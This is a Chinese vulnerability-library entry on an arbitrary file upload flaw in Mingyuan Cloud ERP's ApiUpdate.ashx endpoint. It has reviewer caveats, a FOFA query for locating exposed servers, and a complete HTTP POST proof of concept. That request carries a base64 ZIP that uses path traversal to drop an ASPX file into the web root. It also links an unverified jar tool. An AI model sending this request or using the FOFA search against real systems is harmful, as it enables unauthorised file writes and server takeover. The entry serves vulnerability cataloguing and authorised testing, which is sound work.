---
source: "wy876 漏洞文库"
title: "明源云接口管家 ApiUpdate ZIP路径写入"
product: "明源云接口管家"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "无版本"
prerequisites: "未说明"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/wlaowua3lmsbig8l"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E6%98%8E%E6%BA%90%E4%BA%91erp/%E6%98%8E%E6%BA%90%E4%BA%91ERP%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3%E7%AE%A1%E5%AE%B6ApiUpdate.ashx%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa: "(body=\"hibot.js\" || title=\"明源云ERP\")"
fofa_unverified: "(body="
id: "vw-20564bdba58dc69fb1af8dd2"
entity_id: "ve-20564bdba58dc69fb1af8dd2"
schema_version: "1"
---

# 明源云接口管家 ApiUpdate ZIP路径写入

## 条目说明

- 对象与具体问题：明源云接口管家；ApiUpdate ZIP路径写入
- 版本、配置及部署条件：无版本
- 认证与权限前提：未说明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- base64_decode宏不同于76hexdec但同解压路径根因
- 静态ZIP解码条目../../../fdccloud/_/check.aspx，输出cc4041b9后自删，保留变体不当新漏洞
- FOFA字段残缺、冗长产品宣传；不明jar附件无用途/校验/可信来源，不应随文推荐运行
- 缺build/实际响应

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
明源云ERP系统是一个云端部署的ERP系统，具有高效、灵活和可定制的特点。它支持多种自定义功能，包括表单、报表、流程等，企业可以根据自身业务需求进行个性化定制，提高管理效率与操作便捷性。同时，该系统提供丰富的移动端应用，员工可以随时随地进行业务操作、数据查询与报表分析，实现高效协同，提高企业运营效率。此外，明源云ERP系统还具有精确的财务数据管理功能，通过集成各个财务子模块，实现财务数据的自动收集、整理和汇总，并自动生成准确的财务报表。总之，明源云ERP系统是一个高效、灵活、可定制的ERP系统，可以满足企业的个性化需求，并实现高效协同和精确的财务数据管理。明源云ERP系统接口管家 ApiUpdate.ashx 文件存在任意文件上传漏洞，攻击者通过构造特殊的ZIP压缩包可以上传任意文件，控制服务器。

## 二、影响版本
+ 明源云ERP系统接口管家

## 三、资产测绘
+ fofa`(body="hibot.js" || title="明源云ERP")`
+ 特征


## 四、漏洞复现
```http
POST /myunke/ApiUpdateTool/ApiUpdate.ashx?apiocode=a HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 

{{base64_decode("UEsDBBQAAAAIAPKaC1eX6YtyjAAAAJMAAAAeAAAALi4vLi4vLi4vZmRjY2xvdWQvXy9jaGVjay5hc3B4JMzLCsIwFATQXwmRQrsJCt1IqyiKUPBRWsT1bRhqIWliHoJ/b8TdMGeYOtuxlkawM81jTGHDDwvOsm2doNHWuMCupOEtyWT9xwdo0dz+E9YlMLOHeLgpIOdSlstyNax5UZ0mBXGEQup7uDecuJBtKTzzDq8IH8TdKbEfvFEx4AdFUaXbLwAAAP//AwBQSwECFAMUAAAACADymgtXl+mLcowAAACTAAAAHgAAAAAAAAAAAAAAAAAAAAAALi4vLi4vLi4vZmRjY2xvdWQvXy9jaGVjay5hc3B4UEsFBgAAAAABAAEATAAAAMgAAAAAAA==")}}
```


上传文件位置

```http
/fdccloud/_/check.aspx
```


[Mosaic-crypt-tools-1.5-SNAPSHOT-jar-with-dependencies.jar](https://www.yuque.com/attachments/yuque/0/2024/jar/1622799/1709222141911-beeed224-b25e-4b46-a48c-afe3ed72af43.jar)


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/wlaowua3lmsbig8l>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
